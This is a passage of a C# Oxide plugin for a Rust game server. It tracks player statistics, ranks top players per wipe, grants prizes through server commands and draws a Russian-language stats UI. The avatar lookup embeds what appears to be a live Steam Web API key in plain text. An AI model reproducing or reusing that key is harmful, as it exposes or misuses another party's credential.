                case "sulfur.ore":
                    data[player.userID].gather.sulfurOre += item.amount;
                    break;
                case "hq.metal.ore":
                    data[player.userID].gather.hqmetalOre += item.amount;
                    break;
            }
        }

        void OnExplosiveThrown(BasePlayer player, BaseEntity entity)
        {
            if (player == null || entity == null || (entity is SupplySignal) || (entity is SurveyCharge) || IsNPC(player)) return;
            if (InEvent(player) || InDuel(player)) return;
            if (!data.ContainsKey(player.userID))
            {
                CreatePlayerData(player.userID);
            }
            if (entity.ShortPrefabName == "grenade.beancan.deployed")
            {
                data[player.userID].raid.Beancan++;
                data[player.userID].raid.Explosive++;
            }
            if (entity.ShortPrefabName == "grenade.f1.deployed")
            {
                data[player.userID].raid.F1++;
                data[player.userID].raid.Explosive++;
            }
            if (entity.ShortPrefabName == "explosive.satchel.deployed")
            {
                data[player.userID].raid.Satchel++;
                data[player.userID].raid.Explosive++;
            }
            if (entity.ShortPrefabName == "explosive.timed.deployed")
            {
                data[player.userID].raid.TimedExpl++;
                data[player.userID].raid.Explosive++;
            }

        }

        void OnRocketLaunched(BasePlayer player, BaseEntity entity)
        {
            if (player == null || entity == null || IsNPC(player)) return;
            if (InEvent(player) || InDuel(player)) return;
            if (!data.ContainsKey(player.userID))
            {
                CreatePlayerData(player.userID);
            }
            if (entity.ShortPrefabName == "rocket_basic")
            {
                data[player.userID].raid.Rocket++;
                data[player.userID].raid.RocketLaunched++;
            }
            if (entity.ShortPrefabName == "rocket_fire")
            {
                data[player.userID].raid.Incendiary++;
                data[player.userID].raid.RocketLaunched++;
            }
            if (entity.ShortPrefabName == "rocket_hv")
            {
                data[player.userID].raid.High++;
                data[player.userID].raid.RocketLaunched++;
            }
        }

        void OnEntityDeath(BaseCombatEntity victim, HitInfo info)
        {
            if (victim == null) return;
            BasePlayer vict = victim.ToPlayer();
            if (vict == null) return;
            //killer
            if (info == null) return;
            BasePlayer killer = info.InitiatorPlayer;
            if (IsNPC(killer)) return;
            if (InEvent(vict) || InDuel(vict)) return;
            if (killer != null)
            {
                if (InDuel(killer))
                    return;
            }
            

            if (killer != null && killer != vict)
            {
                if (InEvent(killer) || InDuel(killer)) return;
                if (!data.ContainsKey(killer.userID))
                {
                    CreatePlayerData(killer.userID);
                }
                data[killer.userID].pvp.kills++;
            }
            if (IsNPC(vict)) return;
            if (!data.ContainsKey(vict.userID))
            {
                CreatePlayerData(vict.userID);
            }
            if (!InDuel(vict) || !IsNPC(vict)) data[vict.userID].pvp.deaths += 1;
        }


        void SaveData()
        {
            dataFile.WriteObject(data);

        }


        void OnServerSave()
        {
            SaveData();
        }

        void OnServerInitialized()
        {
            InitFileManager();
            CommunityEntity.ServerInstance.StartCoroutine(LoadImages());
            LoadConfig();
            LoadConfigValues();
            cmd.AddChatCommand(cmdConfigStat, this, showGui);
            foreach (var player in BasePlayer.activePlayerList)
            {
                OnPlayerInit(player);
            }


        }

        IEnumerator LoadImages()
        {
            foreach (var imgKey in Images.Keys.ToList())
            {
                yield return CommunityEntity.ServerInstance.StartCoroutine(
                    m_FileManager.LoadFile(imgKey, Images[imgKey]));
                Images[imgKey] = m_FileManager.GetPng(imgKey);
            }
        }
        Dictionary<string, string> Images = new Dictionary<string, string>()
        {
            { "imagesplayer", "http://i.imgur.com/Ok1A1b7.png" },
            { "imagesplayers", "http://i.imgur.com/eXfS40S.png" },
            { "imageskills", "http://i.imgur.com/YvsDkNs.png" },
            { "imagesgather", "http://i.imgur.com/WxQShQh.png" },
            { "imagesgather1", "https://i.imgur.com/yGmuasy.png" },
        };


        void OnNewSave()
        {
            if (!autoGrantOnWipe) return;
            GenerateLastWipeTopPlayers();
            data = new Dictionary<ulong, PlayerData>();
        }


        bool enabled = false;


        void GenerateLastWipeTopPlayers()
        {
            Dictionary<topSkill, ulong> topUsers = new Dictionary<topSkill, ulong>
            {
                {
                    topSkill.kills, data.OrderByDescending(x => x.Value.pvp.kills).Select(x => x.Key).First()
                },
                {
                    topSkill.raid, data.OrderByDescending(x => x.Value.raid.Explosive + x.Value.raid.RocketLaunched).Select(x => x.Key).First()
                },
                {
                    topSkill.gather, data.OrderByDescending(x => x.Value.gather.wood + x.Value.gather.stone + x.Value.gather.metalOre + x.Value.gather.sulfurOre + x.Value.gather.hqmetalOre).Select(x => x.Key).First()
                },
                {
                    topSkill.online, data.OrderByDescending(x => x.Value.minutes).Select(x => x.Key).First()
                }
            };

            List<SkillTopUser> topBuffer = new List<SkillTopUser>();

            foreach (KeyValuePair<topSkill, ulong> item in topUsers)
                topBuffer.Add(new SkillTopUser(item.Key, item.Value, GetWipeCount(item.Key, item.Value) + 1));

            var topformonth = topBuffer.FindAll(x => x.wipeCount >= 4);

            foreach (SkillTopUser user in topformonth)
            {
                topBuffer.Add(new SkillTopUser(topSkill.topformonth, user.userId, 0));
                user.wipeCount = 0;
            }

            skillTopUsers.Clear();
            skillTopUsers.AddRange(topBuffer);

            lastWipeTopUsersDataFile.WriteObject(skillTopUsers);
        }

        int GetWipeCount(topSkill skill, ulong userId) => (skillTopUsers.Find(x => x.skillType == skill && x.userId == userId)?.wipeCount ?? 0);

        void Loaded()
        {
            data = dataFile.ReadObject<Dictionary<ulong, PlayerData>>();
            time = timingFile.ReadObject<int>();
            timer.Every(3600, timingHandle);
            timer.Every(60, playtimeHandle);
            try
            {
                skillTopUsers = lastWipeTopUsersDataFile.ReadObject<List<SkillTopUser>>();
            }
            catch
            {
                skillTopUsers = new List<SkillTopUser>();
            }
        }

        void timingHandle()
        {
            time = time - 1;
            if (time <= 0)
            {
                PrintWarning("Отчет ТОП сохранен!");
                writeTop();
                time = timeInHours;
            }
            timingFile.WriteObject(time);
        }

        void playtimeHandle()
        {
            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                if (!data.ContainsKey(player.userID))
                {
                    CreatePlayerData(player.userID);
                }
                data[player.userID].minutes++;
            }
        }

        void Unload()
        {
            UnityEngine.Object.Destroy(FileManagerObject);
            SaveData();
            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, "StatsParent");
                CuiHelper.DestroyUi(player, "TopParent");
                CuiHelper.DestroyUi(player, "PlayerStats_bp");
                CuiHelper.DestroyUi(player, "PlayerStats_bp2");
            }
        }

        void OnPlayerInit(BasePlayer player)
        {
            List<SkillTopUser> availableGifts = skillTopUsers.FindAll(x => x.userId == player.userID && !x.giftTaken);
            if (IsNPC(player)) return;
            if (!data.ContainsKey(player.userID))
            {
                CreatePlayerData(player.userID);
            }
            GetAvatar(player.userID, avatar =>
            {
                data[player.userID].avatar = avatar;
                CommunityEntity.ServerInstance.StartCoroutine(m_FileManager.LoadFile($"avatar{player.userID}", avatar));
                SaveData();
            });
            if (availableGifts.Count > 0) // .FindAll не возвращает null
            {
                timer.Once(10f, () =>
                {
                    SendReply(player, $"У вас есть призы по результатам статистики прошлого вайпа.\nДоступные призы: {string.Join(", ", availableGifts.Select(x => x.skillType.ToString()).ToArray())}.\nВведите /topgift <giftname> для получения приза.");
                });
            }
        }

        [ChatCommand("topgift")]
        void cmdChat_topGift(BasePlayer player, string cmd, string[] args)
        {
            List<SkillTopUser> userTOPs = skillTopUsers.FindAll(x => x.userId == player.userID && !x.giftTaken);

            if (userTOPs.Count < 1)
            {
                SendReply(player, "Нет доступных призов.");
                return;
            }

            if (args != null && args.Length > 0)
            {
                topSkill skill;

                try
                {
                    skill = (topSkill)Enum.Parse(typeof(topSkill), args[0].ToLower());
                }
                catch
                {
                    SendReply(player, "Введите /topgift <skillname> для получения приза.");
                    return;
                }

                SkillTopUser skillTopUser = userTOPs.Find(x => x.skillType == skill);

                if (skillTopUser == null)
                {
                    SendReply(player, $"Вы не получали призовое место за скилл {args[0]} или приз уже был получен.");
                    return;
                }
                if (args[0] == "kills")
                {
                    foreach (string command in Kills)
                    {
                        rust.RunServerCommand(command.Replace("{player}", player.userID.ToString()));
                    }
                }
                if (args[0] == "raid")
                {
                    foreach (string command in Raiders)
                    {
                        rust.RunServerCommand(command.Replace("{player}", player.userID.ToString()));
                    }
                }
                if (args[0] == "gather")
                {
                    foreach (string command in Gathers)
                    {
                        rust.RunServerCommand(command.Replace("{player}", player.userID.ToString()));
                    }
                }
                if (args[0] == "online")
                {
                    foreach (string command in Onlines)
                    {
                        rust.RunServerCommand(command.Replace("{player}", player.userID.ToString()));
                    }
                }
                if (args[0] == "topformonth")
                {
                    foreach (string command in Topformonths)
                    {
                        rust.RunServerCommand(command.Replace("{player}", player.userID.ToString()));
                    }
                }

                skillTopUser.giftTaken = true;

                lastWipeTopUsersDataFile.WriteObject(skillTopUsers);

                SendReply(player, "Приз успешно выдан.");

                return;
            }

            SendReply(player, $"Доступные призы: {string.Join(", ", userTOPs.Select(x => x.skillType.ToString()).ToArray())}.");
        }

        void showGui(BasePlayer player, string cmd, string[] args)
        {
            if (!data.ContainsKey(player.userID))
            {
                CreatePlayerData(player.userID);
            }
            drawWindow(player);
        }

        [ConsoleCommand("stat")]
        void drawstatConsole(ConsoleSystem.Arg arg)
        {
            var player = arg.Connection?.player as BasePlayer;
            if (player != null)
            {
                if (!data.ContainsKey(player.userID))
                {
                    CreatePlayerData(player.userID);
                }
                drawWindow(player);
            }
        }

        [ConsoleCommand("grantplayers")]
        void grantstatConsole(ConsoleSystem.Arg arg)
        {
            var player = arg.Connection?.player as BasePlayer;
            if (player == null || IsNPC(player))
            {
                GenerateLastWipeTopPlayers();
                PrintWarning("Игрокам ТОП один выданы бонусы!");
                data = new Dictionary<ulong, PlayerData>();
                SaveData();
            }
        }

        [ConsoleCommand("closestat2")]
        void destroyStat2(ConsoleSystem.Arg arg)
        {
            if (arg.Connection == null) return;
            var player = arg.Player();
            CuiHelper.DestroyUi(player, "PlayerStats_bp2");
        }

        [ConsoleCommand("drawTop")]
        void drawtopConsole(ConsoleSystem.Arg arg)
        {
            var player = arg.Connection?.player as BasePlayer;
            if (player == null || IsNPC(player)) return;
            CuiHelper.DestroyUi(player, "PlayerStats_bp");
            CreateUINext(player);
        }

        [ConsoleCommand("closestat")]
        void destroyStat(ConsoleSystem.Arg arg)
        {
            if (arg.Connection == null) return;
            var player = arg.Player();
            CuiHelper.DestroyUi(player, "PlayerStats_bp");
            CuiHelper.DestroyUi(player, "PlayerStats_bp2");
        }

        [PluginReference]
        Plugin EventManager;

        [PluginReference]
        Plugin Duel;

        bool InEvent(BasePlayer player)
        {
            try
            {
                bool result = (bool)EventManager?.Call("isPlaying", new object[] { player });
                return result;
            }
            catch
            {
                return false;
            }
        }

        bool InDuel(BasePlayer player) => Duel?.Call<bool>("IsPlayerOnActiveDuel", player) ?? false;

        Dictionary<ulong, string> startGui = new Dictionary<ulong, string>();


        void GetAvatar(ulong uid, Action<string> callback)
        {
            if (callback == null) return;
            var reply = 1;
            if (reply == 0) { }
            string url = "http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3F2959BD838BF8FB544B9A767F873457&" +
                "steamids=" + uid;
            webrequest.EnqueueGet(url,
                (i, json) => callback?.Invoke((string)JObject.Parse(json)["response"]["players"][0]["avatarfull"]),
                this);
        }

        string GUI = "[{\"name\":\"PlayerStats_bp\",\"parent\":\"Hud\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"color\":\"0.3019608 0.4156863 0.3921569 0.3921569\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player\",\"parent\":\"PlayerStats_bp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.04853591 0.1542709\",\"anchormax\":\"0.2985358 0.9242711\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_allstats\",\"parent\":\"bp_player\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.87957\",\"anchormax\":\"0.98 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_text\",\"parent\":\"bp_allstats\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"СТАТИСТИКА ИГРОКОВ\",\"fontSize\":24,\"align\":\"MiddleCenter\",\"color\":\"1 1 1 0.8784314\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4203148\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"images_bp\",\"parent\":\"bp_player\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"png\":\"{imagesplayer}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.09713647 0.3486559\",\"anchormax\":\"0.8971364 0.8022848\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_namebp\",\"parent\":\"bp_player\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.2039216 0.2901961 0.2666667 0.5137255\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.1655244\",\"anchormax\":\"1 0.2836826\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Bp_name\",\"parent\":\"bp_namebp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{name}\",\"fontSize\":24,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.412474\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_timebp\",\"parent\":\"bp_player\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.2039216 0.2901961 0.2666667 0.5137255\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.04546227\",\"anchormax\":\"0.9999999 0.1547619\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Bp_timetitle\",\"parent\":\"bp_timebp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Вы на сервере:\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4124726\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.2475422\",\"anchormax\":\"1 1.247542\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"Bp_timerinfo\",\"parent\":\"bp_timebp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{время на сервере}\",\"fontSize\":18,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4235241\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"-0.002928257 -0.2011282\",\"anchormax\":\"0.9970717 0.7988722\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeath\",\"parent\":\"PlayerStats_bp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.3285359 0.694271\",\"anchormax\":\"0.6685358 0.9242711\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killsdeathbp\",\"parent\":\"bp_killsdeath\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.7235056\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killtext\",\"parent\":\"bp_killsdeathbp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"PVP\",\"fontSize\":24,\"align\":\"MiddleLeft\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3992829\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.02846438 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_imageskill\",\"parent\":\"bp_killsdeathbp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"png\":\"{imageskills}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.89 0.07952497\",\"anchormax\":\"0.98 0.949525\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_killdeathtext\",\"parent\":\"bp_killsdeath\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Убийств: {убийств}  Смертей: {смертей}\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3700673\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.1120924\",\"anchormax\":\"1 0.6329262\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_gather\",\"parent\":\"PlayerStats_bp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.3285359 0.4229688\",\"anchormax\":\"0.6685358 0.652969\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_gatherbp\",\"parent\":\"bp_gather\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.7235056\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_gathertitle\",\"parent\":\"bp_gatherbp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Добыто руками\",\"fontSize\":24,\"align\":\"MiddleLeft\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4106175\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.02846438 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_gatherimages\",\"parent\":\"bp_gatherbp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"png\":\"{imagesgather}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.87 0.149525\",\"anchormax\":\"0.9753553 0.828357\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_gather1\",\"parent\":\"bp_gather\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Дерево:  {дерево}  Камень:  {камень}\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4142732\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.4651261\",\"anchormax\":\"1 0.71422\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_gather2\",\"parent\":\"bp_gather\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Серная руда:  {серная руда}  МВК:  {МВК}\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4142732\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.2669832\",\"anchormax\":\"1 0.43682\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_gather3\",\"parent\":\"bp_gather\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Металическая руда:  {руда}\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4142732\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.004529946\",\"anchormax\":\"1 0.2330159\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_raid\",\"parent\":\"PlayerStats_bp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.3285359 0.1542709\",\"anchormax\":\"0.6685358 0.3842711\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_raidbp\",\"parent\":\"bp_raid\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.7235056\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_raidtext\",\"parent\":\"bp_raidbp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Использовано взрывчаток\",\"fontSize\":24,\"align\":\"MiddleLeft\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3992815\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.02846438 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_raidimages\",\"parent\":\"bp_raidbp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"png\":\"{imagesgather1}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.89 0.03857487\",\"anchormax\":\"0.9800001 0.9085751\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_raidloun\",\"parent\":\"bp_raid\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"Выпущено ракет:\nОбычных: {rocket}  Зажигательных: {incend}  Скоростных: {hight}\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4142732\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 -0.002717715\",\"anchormax\":\"1 0.4218744\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_raidexp\",\"parent\":\"bp_raid\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"F1:  {f1}  C4:  {c4}  Beancan: {gbeancan}\nСумка с зарядом: {Satchel}\",\"fontSize\":20,\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4142732\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.0004735941 0.387907\",\"anchormax\":\"1 0.7219194\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1\",\"parent\":\"PlayerStats_bp\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.6985359 0.1542709\",\"anchormax\":\"0.9485359 0.9242711\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1rait\",\"parent\":\"bp_player1\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"drawTop\",\"color\":\"0.2078431 0.2901961 0.2745098 0.5137255\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.2101457\",\"anchormax\":\"0.9999998 0.3001456\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1raittext\",\"parent\":\"bp_player1rait\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"< ОБЩИЙ РЕЙТИНГ >\",\"fontSize\":28,\"align\":\"MiddleCenter\",\"color\":\"0.317647 0.7411765 0.522305 1\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3233584\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1exitbp\",\"parent\":\"bp_player1\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"closestat\",\"color\":\"0.2078431 0.2901961 0.2745098 0.5137255\"},{\"type\":\"NeedsCursor\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.08926517\",\"anchormax\":\"0.9999999 0.1792652\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1exitexit\",\"parent\":\"bp_player1exitbp\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"< ВЫХОД >\",\"fontSize\":28,\"align\":\"MiddleCenter\",\"color\":\"0.3137255 0.7411765 0.5215687 1\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3233584\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player1images\",\"parent\":\"bp_player1\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"png\":\"{imagesplayers}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.09713647 0.3486559\",\"anchormax\":\"0.8971364 0.8022848\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"RectTransform\",\"anchormin\":\"0.07320644 0.1302083\",\"anchormax\":\"0.1464129 0.2604167\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"RectTransform\",\"anchormin\":\"0.07320644 0.1302083\",\"anchormax\":\"0.1464129 0.2604167\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"RectTransform\",\"anchormin\":\"0.07320644 0.1302083\",\"anchormax\":\"0.1464129 0.2604167\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"RectTransform\",\"anchormin\":\"0.07320644 0.1302083\",\"anchormax\":\"0.1464129 0.2604167\"}]},{\"name\":\"CuiElement\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"RectTransform\",\"anchormin\":\"0.07320644 0.1302083\",\"anchormax\":\"0.1464129 0.2604167\"}]},{\"name\":\"CuiElement\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"RectTransform\",\"anchormin\":\"0.07320644 0.1302083\",\"anchormax\":\"0.1464129 0.2604167\"}]}]";

        string NextGUI = "[{\"name\":\"PlayerStats_bp2\",\"parent\":\"Hud\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"color\":\"0.3019608 0.4156863 0.3921569 0.3921569\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_player\",\"parent\":\"PlayerStats_bp2\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.04853591 0.1542709\",\"anchormax\":\"0.2985358 0.9242711\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_allstats\",\"parent\":\"bp_player\",\"components\":[{\"type\":\"UnityEngine.UI.RawImage\",\"sprite\":\"Assets/Content/UI/UI.Background.Tile.psd\",\"color\":\"0.3019608 0.4156863 0.3921569 0.8784314\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0.9224834\",\"anchormax\":\"0.98 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"bp_text\",\"parent\":\"bp_allstats\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"ТОП 20 СЕРВЕРА\",\"fontSize\":24,\"align\":\"MiddleCenter\",\"color\":\"1 1 1 0.8784314\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.4203148\",\"distance\":\"2 -2\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 